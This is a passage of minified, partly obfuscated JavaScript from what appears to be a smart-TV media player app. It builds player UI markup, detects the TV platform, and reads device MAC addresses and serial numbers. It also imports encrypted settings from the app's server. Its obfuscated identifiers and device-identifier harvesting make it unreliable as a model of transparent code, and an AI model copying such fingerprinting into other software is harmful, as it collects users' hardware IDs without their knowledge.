font-family: Georgia, Arial; font-size: 26px; color: rgb(238, 238, 238); margin: 0px; padding: 0px; width: 100%; height: 100%;}'+'.jwplayer{top: 0px; 	left:0px; 	position: absolute !important; z-index: 0 !important;} .video { position: absolute; padding-bottom: 56.25%; height: 0; overflow: hidden; }  .video iframe,   .video object,   .video embed {  position: absolute;  top: 0;  left: 0;  width: 100%;  height: 100%;}'+'@keyframes blink{			50% {opacity:0;}			100% { opacity:1; }		}		@-webkit-keyframes blink{			0% { opacity:1; }			50% { opacity:0; }			100% { opacity:1; }		}		@-moz-keyframes blink{			0% { opacity:1; }			50% { opacity:0; }			100% { opacity:1; }		}'+'vk_audio { padding-left: 60px; }'+'.audiotitle { height: 43px; overflow: hidden; width: 100%; color: #ffd495; }'+'.track-info { position: absolute; top: 2px; left: 218px; height: 10px; width: 70px; text-align: right; }'+'.rtma { position: absolute; top: 62px; left: 250px; width: 50px; text-align: right; height: 10px; font-size: 14px; color: #F8F9F6; }'+'.close-btn { position: absolute; top: 0px; left: 292px; height: 10px; color: rgb(205, 30, 30); }'+'.audio-bar { float: left; position: relative; top: 5px; left: 2px; height: 10px; width: 296px; background-color: #a0b9d6; border-radius: 3px; }'+'.qsearch{width: 100%; height: 21px; white-space: nowrap; line-height: 21px; overflow: hidden; font-size: 18px; color: #dbdbdb;}'+'.qsearch img{float:left;max-width:21px;max-height:19px;padding-top:2px;padding-right:3px;}'+'.qstext{overflow:hidden;text-overflow: ellipsis;margin-top: 0px;padding:0px 3px;margin-left: 23px;}'+'.qsource{color: gray;font-size: 14px;white-space: nowrap;float: right;padding-right: 10px;}'+'.audio-pos { float: left; position: relative; left: 2px; height: 6px; top: 2px; width: 0px; background-color: #5885b8; }'+'.control-btn { display: inline-block; background-image: url('+_img("_ST_audio_controls.png")+'); width: 30px; height: 35px; }'+'.rewind-btn { background-position: 0px -105px; }'+'.pause-btn { background-position: 0px -38px; }'+'.play-btn { background-position: 0px -3px; }'+'.fast-fwd-btn { background-position: 0px -138px; }'+'.repeat-btn { background-position: 0px -174px; }'+'.shuffle-btn { background-position: 0px -73px; }';if(!c.init_style&&head){var css=document.createElement('style');css.type='text/css';if(css.styleSheet)
css.styleSheet.cssText=styles;else css.appendChild(document.createTextNode(styles));head.appendChild(css);c.init_style=1}},tohex:function(x){var hexDigits=["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"];return isNaN(x)?"00":hexDigits[(x-x%16)/16]+hexDigits[x%16]},rgba:function(s){var c=this;var pr=c.params.get("pr");if(pr<=0||pr==100||c.box_low){var match=String(s).match(/\((.*),/);if(match&&match[1]){var m=match[1].split(",");if(m.length>=3){return"#"+c.tohex(m[0])+c.tohex(m[1])+c.tohex(m[2])}}
return s}
return s},appDivBody:function(){var c=this;if(c.inited)return;$_("pr",'<div id="textinfo" style="position: absolute; left: 23px; top: 0px; z-index: 0; background-color: black;"></div>'+'<div id="upbar" style="display:none;position:absolute;overflow: hidden;line-height: '+(c.panelPad-2)+'px;font-size:'+(c.panelPad-2)+'px;width:100%;font-family: Arial, sans-serif;height:'+(c.panelPad)+'px;z-index:1;text-align:center;margin-top:1px;" onmousemove="oInset.panel.hover();">'+'<div id="updatetitle" style="float:left;width: 30%;text-align:left;height: 100%;overflow: hidden;margin-left:5px;"></div>'+'<img align=center style="float:left;margin-left:20%;height:10px;" src="'+_img("_ST_upbar2.png?ndate2300801_")+'" />'+'<div id="updatetime" style="float:right;margin-right:30px;"></div></div>'+'<div id="panel" style="width:100%;border-bottom:1px solid #101010;background-color: #000000;">'+'<div id="ftop" style="width:100%; height: 34px;font-size:18px;">'+'<div id="widgets">'+c.widgets.html()+'</div>'+'<div id="finset" style="font-size:21px;max-width: 68%;width:auto;position: inherit;height:100%;overflow:hidden;float: none;padding: 5px 0px 0px 5px;margin: 0px;text-align:left;white-space: nowrap;"></div>'+'</div>'+'<div id="ftop2" style="margin: 0px;padding: 3px 10px;background-color:#4b4b4b;">'+'<div id="kbuts"></div><div id="sidebar" style="display:none;"></div>'+'</div>'+'</div>'+'<iframe id="site" style="background:none;z-index:0;position:absolute;top:75px;left:0px;height:100%;width:100%;margin:0px; padding:0px; overflow:hidden;border:none;" allow="encrypted-media;" frameborder="0" '+'src=\'\'></iframe>'+'<iframe id="subsite" style="display:none;background:none;z-index:0;position:absolute;top: 10%;left: 25%;height: 80%;width: 50%;border: 1px solid #888888;padding-bottom: 4px;border-radius: 5px;margin:0px;overflow:hidden;" allow="encrypted-media;" frameborder="0" '+'src=\'\'></iframe>'+'<div id="MenuCh" style="position:absolute;z-index:1;display:none;padding:7px;left:290px;width:340px;height:auto;overflow:hidden;font-size:24px;    border-radius: 10px;background-color:#323c42;"></div>  '+'<div id="btdiv" style="position:absolute;top:96%;float:right;width:30%;height:30px;overflow:hidden;display:none;"></div>'+'<div id="quick_but" style="top: 82px; left: 1000px; display: none; padding: 2px; z-index: 1; color: black; background-color: rgb(250, 250, 250); font-size: 25px; position: absolute;"></div>'+'<div id="but_nav" style="width: 10px; height: 581px; top: 87px; left: 4px; padding: 2px; border-radius: 2px; display: none; position: absolute;"></div>'+'<div id="vk_play_button" onclick="keyHandler({keycode:VK_PLAY});" style="width: 30px; height: 35px; top: 95.5%; left: 95%; display: none; position: absolute; background-position: 0px -3px; background-image: url('+_img("_ST_audio_controls.png")+');"></div>'+'<div id="playermini" style="width: 420px; height: 267px; top: 453px; left: 860px; display: none; position: absolute; background-color: black;"></div>');var obh='',obh2='';for(var i=0;i<c.omniBut.length;i++){if(i==5)obh+='<div style="float:right;margin-left: -72px;margin-right: 15px;">';if(i==6)var cl="<span id='bt"+i+"'></span>";else cl="";if(c.omniBut[i].id=="top2text"){var obh2='<div id="'+c.omniBut[i].id+'"'+lIlI11I1I_q0000I1Ypr(1,['" onclick="'+c.omniBut[i].onclick+'" onmouseout="this.style.backgroundColor=\'#1e1e1e\';" onmousemove="this.style.backgroundColor=\'#2e2e2e\';"',''])+' style="background-color:#1e1e1e;float:none;border-radius: 15px;border:2px solid transparent;padding:2px 0 0 6px;margin: 1px 5px 0px 0px;white-space: nowrap;overflow:hidden;padding-top:2px; font-size:19px; height:27px;line-height:24px;"><div id="navigate" style="overflow: hidden;text-overflow: ellipsis;height:100%;margin-top:0px;margin-right: 72px;"></div></div>'}else obh+='<div id="'+c.omniBut[i].id+'"'+lIlI11I1I_q0000I1Ypr(1,['"  onclick="'+c.omniBut[i].onclick+'" onmousemove="mh(-4,'+i+');"',''])+'  style="border:2px solid transparent;float:left;height: 28px;border-radius: 50%;">'+cl+'<img id="'+(i==3?'page_load':'img'+c.omniBut[i].id)+'" style="padding:4px;'+(i==6?'width:18px;height:18px;':'width:20px;height:20px;')+'" src="'+_img(c.omniBut[i].img)+'" /></div>';if(i==6)obh+='</div>'}
$_("kbuts",obh+obh2);if(lIlI11I1I_q0000I1Ypr(1,[1,0]))$_("pr").onmousemove=function(){screensavertimer=-1};if(c.platform()=="mag")c.body.style.margin="10px 15px";c.body.insertAdjacentHTML("beforeend",'<div id="statbar2" style="bottom: 0px; height: 20px; left: 0px; display: none; overflow: hidden; width: 100%; z-index: 1; font-size: 16px; position: absolute; white-space: nowrap; zoom: 100%;"></div></div><div id="ext" style="background: none; height: 640px; top: 43px; left: 0px; overflow: hidden; width: 100%; display: none; position: absolute;"></div><div id="scrsaver" onmousemove="screensavertimer=-1;screensaver_mod(0);" style="background: black; height: 0px; top: 0px; left: 0px; z-index: -1; width: 0px; font-family: Arial, sans-serif;display: none; position: absolute;text-shadow:-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,1px 1px 0 #000;"></div><div id="subtitle" style="width: 1200px; top: 545px; font-size: 40px; left: 40px; position: absolute; display: none; text-align: center; font-weight: bold; text-shadow: black -1px 0px, black 0px 1px, black 1px 0px, black 0px -1px;"></div><div id="bcg1" style="width: 100%; height: 63%; z-index: -1; top: 0px; left: 0px; display: none; position: absolute; background-repeat: repeat-y;"></div><div id="bcg2" style="width: 860px; height: 100%; z-index: -1; position: absolute; top: 0%; left: 0px; display: none;"></div>');var link=document.createElement('link');link.rel='stylesheet';link.href='https://fonts.googleapis.com/css?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap';document.getElementsByTagName('head')[0].appendChild(link);var meta=document.createElement('meta');meta.name="referrer";meta.content="never";document.getElementsByTagName('head')[0].appendChild(meta);if(maJor.platform()=="mag")$_("widgets_time").style.fontWeight="normal";$_("player").insertAdjacentHTML("beforebegin",'<div id="loading" style="position:fixed;top:50%;left:50%;transform: translate(-50%, -50%);z-index:2;display:none;"><img alt="Loading" width="70" height="70" src="'+_img("_ST_loader.gif?ndate241110_")+'"/></div>'+'<video id="video" style="width: 100%; height: 100%; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; margin: 0px; padding: 0px; position: fixed;"></video>'+'<div id="jw" style="width: 100%; height: 100%; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; margin: 0px; padding: 0px; position: absolute;"></div>'+'<div id="other" style="width: 100%; height: 100%; top: 0px; left: 0px; display: none; position: absolute;"></div><div id="whitestripes1" style="width: 100%; height: 0px; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; position: absolute;"></div><div id="whitestripes2" style="width: 100%; height: 0px; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; position: absolute;"></div>');$_("player",'<div id="prekinfo" style="float:left;padding:43px 10px;display:none; color: #c5bfbf;	text-shadow: 		-0   -1px 0   #000000,		 0   -1px 0   #000000,		-0    1px 0   #000000,		 0    1px 0   #000000,		-1px -0   0   #000000,		 1px -0   0   #000000,		-1px  0   0   #000000,		 1px  0   0   #000000,		-1px -1px 0   #000000,		 1px -1px 0   #000000,		-1px  1px 0   #000000,		 1px  1px 0   #000000,		-1px -1px 0   #000000,		 1px -1px 0   #000000,		-1px  1px 0   #000000,		 1px  1px 0   #000000;"><div id="rek_button1" onmousemove="adsPage.rek_sel=0;adsPage.rekBox();" onclick="rek_sel=0;keyHandler({keycode:VK_ENTER});" style="top: 80%;max-width: 22%;left: 5%;  max-height: 80px; overflow: hidden;  padding: 7px; font-size: 22px; display: none; position: absolute; border: 2px solid rgb(197, 195, 195);"></div><div id="rek_button2" onmousemove="adsPage.rek_sel=1;adsPage.rekBox();" onclick="rek_sel=1;keyHandler({keycode:VK_ENTER});" style="padding: 7px;top: 80%;max-width: 22%;left: 75%; font-size: 22px; display: none; max-height: 80px; overflow: hidden; position: absolute; border: 2px solid rgb(197, 195, 195);"></div></div>'+'<div id="pstream" style="width:85%;margin:14px 2%;font-size:96%;text-align:left;color:white;position:absolute;	left:0px;	top:0px;">'+'<div style="float:left;"><div id="pstr" style="float:left;margin-top: 5px;"></div></div><div id="player_time" style="float:left;margin-right:4px;"></div><div id="infR" style="float:left;margin: 0px 7px;color: #c1c1c1;"></div><div id="infPl" style="float:left;margin: 0px 4px;color: #c1c1c1;"></div></div>'+'<div id="buttonTop" style="float:right;margin:5px 1%;"><div class="pbut" id="minimize"></div>  <div class="pbut" id="fullscreen"></div>  <div class="pbut" id="exit_text"></div></div>'+'<div id="playerBottom" style="background: '+c.rgba("rgba(17,19,19,0.56)")+';border-radius: 10px;position:absolute;bottom:5px;left:0px;width:98%;height:188px;margin:0% 1%;">'+'<div style="line-height: 25px;height:25px;overflow:hidden;font-size:24px;margin-left:15%;width:84%;font-weight:bold;margin-top: 5px;margin-bottom: 11px;">'+'<div style="font-size: 20px;font-weight: normal;float:right;text-align: right;"><span id="remainingTime"></span> <span id="totalTime"></span></div>'+'<div id="movTitle" style=""></div>'+'</div>'+'<div id="progressBarClick">'+'<div id="arrowtime" style="white-space: nowrap;display:none;color:black;margin-top: -60px;border-radius: 4px;padding: 2px 6px;height: 22px;font-size: 19px;text-align: center;background-color: rgb(204, 204, 204);position: absolute;"></div>'+'<div id="progressBarStatus" style="float:left;height:100%;background: #c72418;"> </div>'+'<div id="progressBut" style="width: 18px;height: 18px;margin-top: -6px;background: #c72418;border-radius: 13px;border: 4px solid #eeeeee;position:absolute;"></div>'+'<div id="progressBuffer" style="float: left;height: 100%;display:none;background-color:#ffcccc;"> </div>'+'</div>'+'<div style="height: 86px;width:99%;overflow:hidden;">'+'<div style="font-size: 20px;float:right;text-align: right;margin-top: 10px;width:20%;">'+'<span class="p_info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="15" height="15" viewBox="0 0 24 20" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6V12H6V8L10 8V6H4Z" fill="#ffffff"></path> <path d="M20 18H14V16H18V12H20V18Z" fill="#ffffff"></path> <path fill-rule="evenodd" clip-rule="evenodd" d="M4 2C1.79086 2 0 3.79086 0 6V18C0 20.2091 1.79086 22 4 22H20C22.2091 22 24 20.2091 24 18V6C24 3.79086 22.2091 2 20 2H4ZM20 4H4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4Z" fill="#ffffff"></path></svg> <span id="infRatio"></span></span><span id="typeP"></span><span id="infoResolution" class="p_info"></span><br>'+'<div id="movNext"></div>'+'<div id="info_right" style="float: right;width: 238px;font-size: 18px;height: 18px;line-height: 18px;overflow: hidden;text-overflow: ellipsis;white-space: nowrap;padding-top: 2px;"></div>'+'</div>'+'<div id="ptt" style="margin-top: 0px;"></div>'+'<div id="epg_full" style="display: block;line-height: 18px;height:73px;top: 55px; left: 15%;width: 64%; position: absolute;overflow: hidden;font-size: 19px;word-wrap: break-word;"></div> '+'</div>'+'<div id="buttonLayout" style="margin-left:15%;width:83.7%;text-align:center;padding:2px;height:50px;border-radius:5px;background:'+c.rgba("rgba(17,19,19,0.44)")+'">'+'<div class="pbut" id="stop" style="float:left;"></div>'+'<div class="pbut" id="play" style="float:left;"></div>'+'<div class="pbut" id="rewind"></div><div class="pbut" id="forward"></div> '+'<div class="pbut" id="option"></div><div class="pbut" id="prop"></div>  <div class="pbut" id="lastview"></div>  '+'<div class="pbut" id="next" style="float:right;"></div><div class="pbut" id="prev" style="float:right;"></div>'+'</div>'+'<div id="chat" style="width: 280px; height: 100%; top: 0px; left: 1000px; display: none; position: absolute; background-color: black;"></div><div id="thumb" style="top: 534px; left: 300px; width: 128px; height: 72px; overflow: hidden; display: none; padding: 2px; background-color: black; position: absolute;"></div>'+'</div>');for(var i in c.allPlayerButton){if(!$_(i)){break}
if(i=="play"){var but='<div id="vrecovery" onclick="trpt();event.stopPropagation();" style="line-height: 20px;font-size: 18px;display: none;"></div>';$_(i).style.width="10%"}else{but='';if(c.allPlayerButton[i].row[1]==1)$_(i).style.width="7%"}
if(c.allPlayerButton[i].svg&&maJor.supports.svg)but+=c.allPlayerButton[i].svg;else but+="<img align='center' style='margin-top: -6px;width: 100%;width: 55px;height: 50px;' src='"+_img(c.allPlayerButton[i].img)+"' />";$_(i,but);if(lIlI11I1I_q0000I1Ypr(1,[1,0])){$_(i).onmousemove=function(){vPlayer.pos[1]=maJor.allPlayerButton[this.id].row[1];vPlayer.pos[0]=maJor.allPlayerButton[this.id].row[0];vPlayer.setFocus(0)}
$_(i).onclick=function(){vPlayer.pos[1]=maJor.allPlayerButton[this.id].row[1];vPlayer.pos[0]=maJor.allPlayerButton[this.id].row[0];vPlayer.setFocus(0);vPlayer.selectedButton()}}}
if(c.platform()=="android-device"){var meta=document.createElement('meta');meta.name="viewport";meta.content="width=1280";document.getElementsByTagName('head')[0].appendChild(meta)}
FXMLPage.l1I1IQlO1ZkV1IOOOllYpr();c.inited=1;for(var i in document.getElementsByTagName("link")){v=document.getElementsByTagName("link")[i];if(v&&v.href&&v.href.indexOf(".css")>0)v.parentNode.removeChild(v)}
$_("player").ondblclick=function(){if(vPlayer.player().fullscreen)vPlayer.player().fullscreen()}},statusbarcreate:function(){var div=document.createElement('div');div.id="statbar2";div.style.bottom="0px";div.style.height="20px";div.style.left="0px";div.style.display="none";div.style.overflow="hidden";div.style.width="100%";div.style.zIndex="0";div.style.fontSize="16px";div.style.position="absolute";div.style.whiteSpace="nowrap";document.getElementsByTagName('body')[0].appendChild(div);return div},fp:function(text,full){var c=this,ch;var s=gV(text).toString();if(full)s="_FP"+s+"_";var lang=c.params.get("lang");if(s.indexOf("_FP")>-1){if(0&&_lang.lang&&_lang.lang._powered=="translate.yandex.ru"){var k="",v="";for(var i in _lang.ru){if(k!="")k+="\n";if(v!="")v+="\n";k+=_lang.ru[i];v+=i}
llO0O0lhrlO01O1O1YprPost("http://exec.remotecurl.appfxml.com/os/api.php?do=translate&lang="+lang,"v="+v+"&s="+encodeURIComponent(k),"translate");_lang.lang._powered="Powered translate.yandex.ru";return}
var regexp=new RegExp("_FP(.*?)_","g");while((ch=regexp.exec(text))!=null){if(lang&&window._lang&&_lang[lang]&&_lang[lang][ch[1]])var t=_lang[lang][ch[1]];else t=ch[1];s=s.replace("_FP"+ch[1]+"_",t)}}
return s},popUp:function(text,timer){var c=this;$_("popUp").style.top="84%";$_("popUp").style.left="75%";$_("popUp").style.width="23%";$_("popUp").style.maxWidth="23%";$_("popUp").style.fontSize="15px";$_("popUp").style.textAlign="left";$_("popUp").style.backgroundColor="#E0E0E0";$_("popUp").style.border="1px solid #767676";$_("popUp").style.color="black";timer=timer||3500;clearTimeout(c.popTimer);if(!text)$_("popUp").style.display="none";else{if($_("popUp").style.display=="block")$_("popUp").style.display="none";setTimeout(function(){if($_("MenuCh").style.display=="block")return;$_("popUp",text);$_("popUp").style.display="block";c.popTimer=setTimeout(function(){$_("popUp").style.display="none"},timer)},160)}},statusbar:function(text,mode,player){var c=this,timer=45000;text=text||"";player=player||0;mode=gV(mode);var div=$_("statbar2");if(div){clearTimeout(c.statusTimer);clearTimeout(c.statusTimer2)}else div=c.statusbarcreate();if(!player&&(handler=="player"||handler=="qual")&&$_("loading").style.display!="block"&&text!="off")return;clearTimeout(statusTimer);var timer=45000;if(mode==null){timer=1000;mode=""}
if(text=="off"||text=="")div.style.display="none";else{if(text&&text.indexOf("http")===0)text=getInfoUrl(text);if(mode=="hint"){timer=10000}else if(mode=="link"){if(text.indexOf("curl ")==0){var curl=parseCURL(text);text=curl.url;if(curl.method=="POST")text+=" "+curl.body}
text=text.split("#POST")[0];if(text.indexOf("?list=")>0){text=unescape(text.split("?list=")[1])}
text=text.replace(/.box_client=lg.*/,"");text=text.replace(/.w_lang=.*/,"");text=text.replace(/.*?\/xhr.php.../,"...");text="_FPOzhidanie_ "+text}else if(mode=="error"){text="<span style='color:red;'>"+text+"</span>"}else if(mode=="dns"){text="_FPOzhidanie_ DNS "+text}else if(mode=="translate"){timer=60000;text="_FPOzhidanie_ "+text}else if(mode=="copy"){timer=900000}
if(mode=="fulllink"){if(text.lastIndexOf("http")>5){var text="_FPOzhidanie_ "+"http"+decodeURIComponent(text.split("http")[1])}else text="_FPOzhidanie_ "+text}
if(text.indexOf(" forkdlna")>0)text=text.replace("forkdlna","http://"+getip("remoteip")+"/treeview?/");if(text.match(/^(remote|weather|torrserve|acestream|widgets_time)/)){var id=text;if(text=="remote")text=c.widgets.info("remote")+" Remote LOCAL_IP:<br>"+getip("remoteip");if(text=="weather")text=c.fp("Select city",1)+": "+(c.params.get("weather")||c.fp("automatically",1));if(text.indexOf("torrserve")===0)text=c.widgets.info(text)+" TORRSERVE_IP:<br>"+getip(text,null,1);if(text=="acestream")text=c.widgets.info("acestream")+" ACESTREAM_IP:<br>"+getip("acestream",null,1);if(text=="widgets_time")text=T.humanDate+"<br>_FPTime offset_: "+T.offset;return c.widgets.showinfo(text,id)}else if(getSelect()==-1)$_("popUp").style.display="none";if(booting)div.style.zIndex=3;else div.style.zIndex=1;$_("statbar2","<div id='textbar' style='height: 100%;display:inline-block;padding:0px 2px;margin: auto 0px;max-width:300px;overflow:hidden;text-overflow: ellipsis;color:#7D7D7D;background-color:#FAFAFA;'>"+text+"</div>");clearTimeout(statusTimer2);statusTimer2=setTimeout(function(){$_("textbar").style.maxWidth=""},2200);div.mode=gV(mode);div.style.display="block";statusTimer=setTimeout('$_("statbar2").style.display="none";',timer)}},showfon:1,fonEnabled:function(){var c=this;if(c.params.get("fon")==-1||!c.showfon||c.params.get("pr")==0)return 0;else return 1},platform:function(){var c=this,p="";if(c._platform)return c._platform;if(document.location.href.indexOf("dns=")>0)c.uadns=document.location.href.split("dns=")[1];else if(window.dns)c.uadns=dns;c.pluginAPI=pluginAPI;if(window.andr&&andr.cmd){p="android-device";c.app_cors=!0}else if(window.tizen){p="tizen";c.app_cors=!0}else if(c.pluginAPI){p="maple";c.app_cors=!0}else if(window.webOS)p="lgw";else if(ua.match(/mag200/)||window.gSTB){p="mag";c.app_cors=!0}else if(ua.match(/dune/)&&$_("dune-api")&&$_("dune-api").init){p="dune";c.app_cors=!0}else if(ua.match(/android/)){p="android"}else if(ua.match(/hisense/i))p="hisense";else if(ua.match(/webos.tv-20(15|16|17|18|19|2|3)/)){p="lgw2"}else if(ua.match(/webos/)){p="lgw"}else if(ua.match(/webappmanager/)){p="lg"}else if(ua.match(/lg simplesmart/)){p="lg"}else if(ua.match(/netcast|lge;/)){p="lg"}else if(ua.match(/philips/))p="ph";else if(window.__spark_stbid__){p="spark";c.app_cors=!0;c.box_low=1;c.showfon=!1}else if(ua.match(/sony|bravia|playstation|inettvbrowser|bravia/))p="sony";else if(ua.match(/skyworth/i))p="skyworth";else if(ua.match(/iphone|ipad/i))p="iphone";else if(ua.match(/vestel/i))p="vestel";else if(ua.match(/viera/))p="pa";else if(ua.match(/toshiba/))p="ts";else if(ua.match(/polaroid|sharp|sraf/i)){p="sharp"}else if(ua.match(/ucbrowser/))p="uc";else if(ua.match(/netrange/))p="netrange";else if(ua.match(/hbbtv/))p="hbbtv";else if(ua.match(/tcl/))p="tcl";else if(ua.match(/opera tv/))p="operatv";else if(ua.match(/nettv/))p="nettv";else if(ua.match(/qtembedded;/))p="qtembedded";else if(ua.match(/tizen/))p="webtizen";else if(ua.match(/pixel/))p="pixel";else if(ua.match(/tv;|omi\//))p="tv";else if(ua.match(/sbertv/))p="sbertv";else if(ua.match(/mobile/))p="mobile";else if(ua.match(/smart tv|tvbrowser/))p="tvbrowser";else if(ua.match(/(smart-tv|maple|navi|lg|tv store)/)){p="yes"+ua.match(/(smart-tv|maple|navi|lg|tv store)/)[1].replace("-","_")}else if(window.tFlp&&tFlp!="LG")p="v_"+tFlp;else{p="no"}
if(document.location.href.indexOf("idemag")>0)p="mag";if(ua.match(/firefox\/2\.5/)){c.box_low=1;c.showfon=!1}
if(window.glg_uid){p="lg";c.lg_uid=glg_uid}
c.loader_platform=window.loader_platform||"";if(c.loader_platform=="lg_webos"){c.app_cors=!0;p="lgw"}else if(c.loader_platform=="lg_netcast"){c.app_cors=!0;p="lg"}
c._platform=p;if(p=="tizen"){c.app_cors_referer=0;if(!window.webapis)lI0Il1OrlwllI1Ypr("$WEBAPIS/webapis/webapis.js")}
if(window.box_low)c.box_low=1;if(!p.match(/^(maple|tizen|mag|dune|android-device)/)){c.hashR=!0;window.addEventListener("popstate",function(n){if(nkh<3&&(document.location.hash!="#"+c.numBack2||document.location.hash=="#"+c.numBack)){keyHandler({"keycode":VK_BACK});c.sethash()}},!1)}
return p},numBack:0,numBack2:-1,backCounter:0,sethash:function(n){var c=this;if(c.hashR){c.backCounter++;c.numBack=c.numBack2;var h=document.location.hash.replace("#","").split(";");if(h.length==1)h[0]="";if(n==null)n=getInfoUrl();if(n==null)n=h[0];else{n=n.replace(/[^a-zA-Z0-9:\/_\.=\?\-\&]/g,"")}
n+=";"+c.backCounter;c.numBack2=n;document.location.hash=c.numBack2}},screen:function(){var c=this;if(c.platform()=="maple"){c.innerW=1280;c.innerH=720}else{c.innerW=window.innerWidth
c.innerH=window.innerHeight}
return{w:c.innerW,h:c.innerH}},generateId:function(){var c=this;var pref={"polaroid":"pd","finlux":"fn","telefunken":"tf","digihome":"dg","tizen":"st","smart-tv":"sa","toshiba":"ts","hisense":"hc","vestel":"et","android":"ad","skyworth":"sk","viera":"pa","lg":"lg","philips":"ph","sony":"sn","tcl":"tc"};var bid="pc";for(var i in pref)if(ua.indexOf(i)!=-1&&bid=="pc")bid=pref[i];var m=ua.match(/\(.*?\)/g);if(m){for(var i in m){var d=m[i].match(/([\d]+)/g);if(d)bid+=d.join("")}}
c.BID=bid.substr(0,6);if(c.ipG){var t=c.BID+ip2long(c.ipG).toString().split("").reverse().join("")+ip2long(c.ipG);t=t.substr(0,12);c.popUp("First run generate unique ID<br>"+t);return t}},rand:function(min,max){if(min==null)min=100000;if(max==null)max=990000;return Math.floor(Math.random()*(max-min+1)+min)},remoteData:{get:function(u,cc){var c=maJor,t=this;var key=String(c.getXY().split("|")[0].split("=")[1]||c.rand());uHelper.create("directnoheader").getI(u||"http://cloudflare.appfxml.com/browseraccount/?do=fimport&v=auto&rev=4&mtd="+key).parse=function(s){s=mB64.decrypt(gV(s),key);if(t.oncomplete)t.oncomplete(s);else{if(cc.canceled){return}
var x=s.split("[-..-]");if(x.length<3){kjtYpr.inf("Error format import file!",2500);is_loadpage(-1)}else{c.autoimpok=2;for(var i=0;i<x.length&&i<c.allfs.length;i++){if(c.allfs[i]=="storage")continue;if(c.allfs[i]=="settings"){var xx=lIlI1VBOOlI01QYpr(x[i]);if(xx!=null){xx.ts=0;xx.name=c.params.get("name");x[i]=l1OOl0I0IASY10lQ10Ypr(xx)}}
c.write(c.allfs[i],x[i]);maJor.statusbar("write "+c.allfs[i]+" ("+x[i].length+"byte)","link")}
maJor.statusbar("Иморт завершен","link");c.popUp("Перезагрузите приложение!");c.params.set("ts",0);if(c.platform()!="mag"){document.location.reload();location.reload()}}}}
return t}},getAndrInit:function(){var c=this;if(window.andr){var s=andr.cmd("initial")||"|||||||";c.signature=s;c.hardware=s.split("|")[2];c.build=s.split("|")[4];c.sdk=s.split("|")[1];c.api="androidapi";c.ID=s.split("|")[7]}
if(c.ID&&c.ID.length<15)c.ID=""},appIDInit:function(){var c=this;c.ID="";if(c.platform()=="maple"){try{c.ID=$_("pluginNetwork").GetMAC(1);c.api="samsapi";c.hardware=($_("pluginTV")&&$_("pluginTV").GetProductCode&&$_("pluginTV").GetProductCode(1))||"";c.series=(c.hardware.replace("BD-","").indexOf("D")!=-1||c.hardware.indexOf("BD-E5")!=-1)?"D":c.series;c.series=(c.hardware.indexOf("C")!=-1)?"C":c.series;c.series=(c.hardware.indexOf("E")!=-1)?"E":c.series}catch(e){jsshowErr("sams pluginTV "+e.message)}
try{if(window.webapis)c.IDS=webapis.tv.info.getDeviceID()}catch(e){}
try{widgetAPI.sendReadyEvent();c.pluginAPI.unregistKey(tvKey.KEY_VOL_UP);c.pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);c.pluginAPI.unregistKey(tvKey.KEY_MUTE);window.onShow=function(){c.pluginAPI.setOffScreenSaver();c.pluginAPI.setOffIdleEvent();c.pluginAPI.unregistKey(tvKey.KEY_VOL_UP);c.pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);c.pluginAPI.unregistKey(tvKey.KEY_MUTE);c.pluginAPI.registKey(tvKey.KEY_GUIDE);c.pluginAPI.registKey(tvKey.KEY_SOURCE);c.pluginAPI.unregistKey(203);c.pluginAPI.unregistKey(204);c.pluginAPI.registKey(613);c.pluginAPI.registKey(105);c.pluginAPI.registKey(106);c.pluginAPI.registKey(309);c.pluginAPI.registKey(612);c.pluginAPI.registKey(1118);c.pluginAPI.registKey(1219);c.pluginAPI.registKey(84);c.pluginAPI.registKey(655);c.pluginAPI.registKey(1089);c.pluginAPI.registKey(1057);c.pluginAPI.registKey(1083);c.pluginAPI.registKey(1078);c.pluginAPI.registKey(1080);c.pluginAPI.registKey(1086);c.pluginAPI.registKey(78);c.pluginAPI.registKey(1249)};$_('pluginObjectNNavi').SetBannerState(2)}catch(e){jsshowErr("sams pluginAPI "+e.message)}}else if(c.platform()=="tizen"){try{c.ID=webapis.network.getMac();c.api="tizenapi"}catch(e){}
try{c.hardware=webapis.productinfo.getModel();c.IDS=webapis.productinfo.getDuid()}catch(e){}
try{if(tizen.tvinputdevice&&tizen.tvinputdevice.registerKey){var tk=["0","1","2","3","4","5","6","7","8","9","ColorF0Red","ColorF1Green","ColorF2Yellow","ColorF3Blue","MediaPlay","MediaStop","MediaPause","MediaRewind","MediaFastForward","MediaRecord","MediaPlayPause","ChannelList","ChannelUp","ChannelDown","PreviousChannel","Info"];for(var i in tk)tizen.tvinputdevice.registerKey(tk[i]);}}catch(e){jsshowErr("tvinputdevice "+e.message)}
if(!c.ID&&window.cpmac){c.api="tizencut";c.ID=cpmac;c.hardware=cphardware;c.IDS=cpserial}}else if(c.platform()=="dune"){stb=$_("dune-api");stb.init();stb.setColorKey(1);c.ID=stb.getSerialNumber();c.ID=c.ID.toString().replace(/-/g,"").replace(/0000/g,"");c.hardware=stb.getProductId()+"-"+stb.getApiVersion();c.api="duneapi"}else if(c.platform()=="mag"&&window.gSTB){stb=gSTB;if(window.innerHeight<576)c.resolution_prefix=576;stb.EnableServiceButton(!0);stb.InitPlayer();c.resolution_portal=document.referrer||"file:///home/web/services.html";c.ID=stb.GetDeviceMacAddress();c.IDS=stb.GetDeviceSerialNumber();c.hardware=stb.GetDeviceModel();c.api="magapi";window.moveTo(0,0);stb.SetVolume(80)}else if(c.platform()=="spark"){c.ID=__spark_stbid__;c.hardware=__model__+"/"+__appVersion__;c.api="sparkapi"}else if(c.platform()=="android-device"){c.getAndrInit()}else 